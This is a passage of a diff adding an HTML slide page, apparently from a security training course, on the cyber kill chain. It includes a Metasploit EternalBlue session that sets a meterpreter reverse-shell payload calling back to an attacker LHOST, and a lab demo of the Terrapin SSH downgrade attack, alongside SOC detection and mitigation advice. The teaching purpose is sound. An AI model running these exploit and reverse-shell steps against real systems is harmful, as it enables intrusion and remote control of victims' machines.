+      <div class="port-row"><span class="port-badge">PORT 22</span><span class="port-service">SSH</span><span class="port-arrow">→</span><span class="port-phase">Exploitation (SSH Brute Force / CVE)</span><span class="port-arrow">→</span><span class="port-phase" style="color:var(--green)">C2 (Reverse Shell via SSH tunnel)</span><div class="port-desc">Terrapin Attack (CVE-2023-48795) — MITM handshake downgrade</div></div>
+      <div class="port-row"><span class="port-badge">PORT 80</span><span class="port-service">HTTP</span><span class="port-arrow">→</span><span class="port-phase">Exploitation (SQLi / XSS / RFI)</span><span class="port-arrow">→</span><span class="port-phase" style="color:var(--green)">C2 (Web Shell / HTTP Beacon)</span><div class="port-desc">DVWA, Mutillidae — web app exploitation via Burp Suite</div></div>
+      <div class="port-row"><span class="port-badge">PORT 443</span><span class="port-service">HTTPS</span><span class="port-arrow">→</span><span class="port-phase">Exploitation (SSL/TLS vuln)</span><span class="port-arrow">→</span><span class="port-phase" style="color:var(--green)">C2 (Encrypted C2 over HTTPS)</span><div class="port-desc">Encrypted C2 traffic — hard to detect without SSL inspection</div></div>
+      <div class="port-row"><span class="port-badge">PORT 139/445</span><span class="port-service">SMB</span><span class="port-arrow">→</span><span class="port-phase" style="color:var(--accent2)">Exploitation (EternalBlue)</span><span class="port-arrow">→</span><span class="port-phase" style="color:var(--purple)">Lateral Movement</span><div class="port-desc">MS17-010 — exploit/windows/smb/ms17_010_eternalblue</div></div>
+      <div class="port-row"><span class="port-badge">PORT 3306</span><span class="port-service">MySQL</span><span class="port-arrow">→</span><span class="port-phase">Exploitation (Brute Force / Auth bypass)</span><span class="port-arrow">→</span><span class="port-phase" style="color:var(--accent3)">Actions (Data Exfiltration)</span><div class="port-desc">Database dump via SQL injection or direct unauthenticated login</div></div>
+    </div>
+  </div>
+
+  <!-- METASPLOIT PAYLOAD -->
+  <div class="section reveal">
+    <div class="slide-tag">PENDING TASK — METASPLOIT</div>
+    <h2>Auto Payload Recommendation in <span class="hl">Metasploit</span></h2>
+    <div class="grid-2 mt-16">
+      <div class="panel"><div class="panel-title">WHY AUTO-RECOMMEND HAPPENS</div><ul class="list"><li>Exploit designed for specific architectures (x86, x64, Windows, Linux)</li><li>Module developer pre-defined compatible payloads</li><li>Some payloads more stable with specific vulnerabilities</li><li>Increases exploitation success rate significantly</li></ul></div>
+      <div class="panel gold"><div class="panel-title">BLIND SHELL vs REVERSE SHELL</div>
+        <table class="compare-table">
+          <tr><th>SCENARIO</th><th>RECOMMENDATION</th></tr>
+          <tr><td>Firewall blocks inbound</td><td style="color:var(--green)">Reverse Shell — target connects back to attacker</td></tr>
+          <tr><td>Attacker has direct access</td><td style="color:var(--accent)">Bind Shell — opens port on target, attacker connects</td></tr>
+          <tr><td>Blind injection (SQLi, XXE)</td><td style="color:var(--accent2)">Blind Shell — no output confirmation available</td></tr>
+          <tr><td>NAT / strict egress filter</td><td style="color:var(--purple)">DNS/HTTPS C2 payload preferred</td></tr>
+        </table>
+      </div>
+    </div>
+    <div class="code-block mt-20">
+      <div><span class="comment"># MSF auto-selection example — EternalBlue exploit</span></div>
+      <div><span class="prompt">msf6 &gt;</span> <span class="cmd">use exploit/windows/smb/ms17_010_eternalblue</span></div>
+      <div><span class="prompt">msf6 exploit(...) &gt;</span> <span class="cmd">show payloads</span></div>
+      <div><span class="info">[*] Compatible Payloads</span></div>
+      <div>&nbsp;&nbsp;<span class="success">windows/x64/meterpreter/reverse_tcp</span>  <span class="comment">← AUTO RECOMMENDED</span></div>
+      <div>&nbsp;&nbsp;windows/x64/shell/reverse_tcp</div>
+      <div>&nbsp;&nbsp;windows/x64/powershell_reverse_tcp</div>
+      <div><span class="prompt">msf6 exploit(...) &gt;</span> <span class="cmd">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span></div>
+      <div><span class="prompt">msf6 exploit(...) &gt;</span> <span class="cmd">set LHOST 192.168.1.100</span></div>
+      <div><span class="prompt">msf6 exploit(...) &gt;</span> <span class="cmd">run</span></div>
+      <div><span class="success">[+] 192.168.1.50:445 — =-=-=-=-=-=-=-=-=-=-=-=-=-=-</span></div>
+      <div><span class="success">[+] Meterpreter session 1 opened!</span></div>
+    </div>
+  </div>
+
+  <!-- TERRAPIN ATTACK -->
+  <div class="section reveal">
+    <div class="slide-tag">PENDING TASK — CVE-2023-48795</div>
+    <h2>Terrapin Attack — <span class="hl2">SSH Protocol Downgrade</span></h2>
+    <div class="grid-2 mt-16">
+      <div class="panel red"><div class="panel-title">WHAT IS TERRAPIN?</div><ul class="list red"><li>Vulnerability in SSH protocol handshake (CVE-2023-48795)</li><li>Attacker acts as MITM between SSH client and server</li><li>Drops SSH_MSG_EXT_INFO packet silently during handshake</li><li>Security extensions removed without any visible error</li><li>SSH login succeeds — neither user nor server is aware</li></ul></div>
+      <div class="panel"><div class="panel-title">ATTACK FLOW</div>
+        <div class="flow-step attack-step"><div class="step-num">1</div><div><div class="step-title">Client initiates SSH connection</div><div class="step-desc">SSH client connects to port 2222 (MITM proxy)</div></div></div>
+        <div class="flow-step attack-step"><div class="step-num">2</div><div><div class="step-title">MITM proxy relays to real server</div><div class="step-desc">Attacker forwards traffic, monitors the handshake</div></div></div>
+        <div class="flow-step attack-step"><div class="step-num">3</div><div><div class="step-title">SSH_MSG_NEWKEYS intercepted</div><div class="step-desc">Both sides exchange new keys — proxy captures this moment</div></div></div>
+        <div class="flow-step attack-step"><div class="step-num">4</div><div><div class="step-title">EXT_INFO packet DROPPED ✗</div><div class="step-desc">Security extensions silently removed, connection continues</div></div></div>
+      </div>
+    </div>
+    <div class="code-block mt-20">
+      <div><span class="comment"># Terminal 1: Start MITM proxy on attacker container</span></div>
+      <div><span class="prompt">$</span> <span class="cmd">docker exec -it terrapin-attacker python3 /attack/manual_attack_demo.py</span></div>
+      <div><span class="info">[*] Starting proxy on port 2222 → target: vulnerable-server:22</span></div>
+      <div><span class="info">[*] Waiting for SSH client to connect...</span></div>
+      <br>
+      <div><span class="comment"># Terminal 2: SSH client connects THROUGH the proxy</span></div>
+      <div><span class="prompt">$</span> <span class="cmd">docker exec -it terrapin-client ssh -o StrictHostKeyChecking=no -p 2222 testuser@attacker</span></div>
+      <div><span class="comment"># Password: password123</span></div>
+      <br>
+      <div><span class="info">[INFO] SSH_MSG_NEWKEYS detected (client→server)</span></div>
+      <div><span class="info">[INFO] SSH_MSG_NEWKEYS detected (server→client)</span></div>
+      <div><span class="attack">[ATTACK] Dropping SSH_MSG_EXT_INFO packet from server!</span></div>
+      <div><span class="attack">[ATTACK] Packet size: 156 bytes — security extensions removed</span></div>
+      <div><span class="success">[+] Attack SUCCESS! Dropped 1 EXT_INFO packet(s)</span></div>
+      <br>
+      <div><span class="comment"># Wireshark: filter `ssh` → find NEWKEYS without EXT_INFO after it</span></div>
+    </div>
+    <div class="alert-box mt-20"><div class="alert-icon">⚠</div><div><strong>Wireshark Proof:</strong> Apply filter <code style="color:var(--accent);font-family:'Share Tech Mono'">ssh</code> → Locate SSH_MSG_NEWKEYS (type 21) → Confirm that SSH_MSG_EXT_INFO (type 7) is missing immediately after. This proves the attack successfully dropped the security extension packet.</div></div>
+  </div>
+
+  <!-- SOC DISCUSSION -->
+  <div class="section reveal">
+    <div class="slide-tag">SOC ANALYST PERSPECTIVE</div>
+    <h2>Detection Strategy — <span class="hl">Breaking the Chain</span></h2>
+    <div class="kpi-row mt-16">
+      <div class="kpi-box"><div class="kpi-val">7</div><div class="kpi-label">KILL CHAIN PHASES</div></div>
+      <div class="kpi-box"><div class="kpi-val" style="color:var(--accent2)">4+</div><div class="kpi-label">BREAK POINTS</div></div>
+      <div class="kpi-box"><div class="kpi-val" style="color:var(--green)">EARLY</div><div class="kpi-label">OPTIMAL BREAK STAGE</div></div>
+      <div class="kpi-box"><div class="kpi-val" style="color:var(--accent3)">SIEM+EDR</div><div class="kpi-label">PRIMARY TOOLING</div></div>
+    </div>
+    <div class="grid-2 mt-20">
+      <div class="flex-col">
+        <div class="panel"><div class="panel-title">SOC ANALYST USES KILL CHAIN TO:</div><ul class="list"><li>Identify the current stage of an ongoing attack</li><li>Recognize attacker objectives and predict next move</li><li>Detect intrusions before data exfiltration occurs</li><li>Prioritize incident response actions effectively</li></ul></div>
+        <div class="panel red"><div class="panel-title">LIMITATIONS OF TRADITIONAL MODEL</div><ul class="list red"><li>Doesn't address insider threat scenarios</li><li>Focuses on perimeter — ignores east-west movement</li><li>Not significantly updated since 2011</li><li>Modern attackers blend or skip multiple phases</li></ul></div>
+      </div>
+      <div class="flex-col">
+        <div class="panel gold"><div class="panel-title">COMPLEMENTARY FRAMEWORKS</div><ul class="list gold"><li><strong>MITRE ATT&amp;CK</strong> — Detailed TTPs with real-world adversary techniques</li><li><strong>Unified Kill Chain</strong> — 18 phases, covers insider threats &amp; APTs</li><li><strong>Diamond Model</strong> — Adversary-capability-infrastructure-victim analysis</li></ul></div>
+        <div class="panel green"><div class="panel-title">BEST DETECTION TOOLS</div><ul class="list green"><li>SIEM (Splunk / ELK Stack) — correlation rules across phases</li><li>EDR (CrowdStrike / SentinelOne) — endpoint telemetry &amp; response</li><li>Wireshark / Zeek — deep network packet analysis</li><li>Sysmon — Windows process, network &amp; registry logging</li></ul></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CONCLUSION -->
+  <div class="section reveal">
+    <div class="slide-tag">CONCLUSION</div>
+    <h2>Key <span class="hl">Takeaways</span></h2>
+    <div class="big-quote mt-16">"Breaking the kill chain at any stage prevents the attacker from reaching their objective. The earlier the break, the lower the cost of defense — and the higher the defender's advantage."</div>
+    <div class="grid-2 mt-24">
+      <div class="flex-col">
+        <div class="panel"><div class="panel-title">KILL CHAIN SUMMARY</div><ul class="list"><li>7 structured phases from recon to objective completion</li><li>Nmap scanning = Phase 1 (Active Reconnaissance)</li><li>Each open port creates a vector into later attack phases</li><li>SOC analysts can detect and break the chain at every stage</li></ul></div>
+        <div class="alert-box success"><div class="alert-icon">✓</div><div>Mastering this framework is <strong>essential</strong> for SOC Analysts, Threat Hunters, and Incident Responders to build effective cyber defense strategies.</div></div>
+      </div>
+      <div class="flex-col">
+        <div class="panel red"><div class="panel-title">TERRAPIN (CVE-2023-48795)</div><ul class="list red"><li>SSH protocol-level downgrade via silent MITM attack</li><li>No visible error displayed to the SSH user at any point</li><li>Detected via Wireshark — NEWKEYS without following EXT_INFO</li><li>Mitigate: update OpenSSH, disable vulnerable KEX algorithms</li></ul></div>
+        <div class="panel gold"><div class="panel-title">METASPLOIT INSIGHTS</div><ul class="list gold"><li>Auto payload = best architecture compatibility for the target</li><li>Reverse shell preferred when the firewall blocks inbound</li><li>Bind shell when attacker has direct network access to target</li></ul></div>
+      </div>
+    </div>
+    <div style="margin-top:48px;display:flex;gap:10px;flex-wrap:wrap;padding-bottom:20px;">
+      <span class="badge cyan">TEAM-A</span>
+      <span class="badge gold">DAY 2 COMPLETE</span>
+      <span class="badge red">CVE-2023-48795 DEMONSTRATED</span>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  // Scroll progress
+  window.addEventListener('scroll',()=>{
+    const s=window.scrollY,d=document.documentElement.scrollHeight-window.innerHeight;
+    document.getElementById('progressFill').style.width=(s/d*100)+'%';
+  });
+  // Reveal on scroll
+  const obs=new IntersectionObserver(entries=>entries.forEach(e=>{if(e.isIntersecting)e.target.classList.add('visible');}),{threshold:0.08,rootMargin:'0px 0px -40px 0px'});
+  document.querySelectorAll('.reveal').forEach(el=>obs.observe(el));
+</script>
+</body>
+</html>
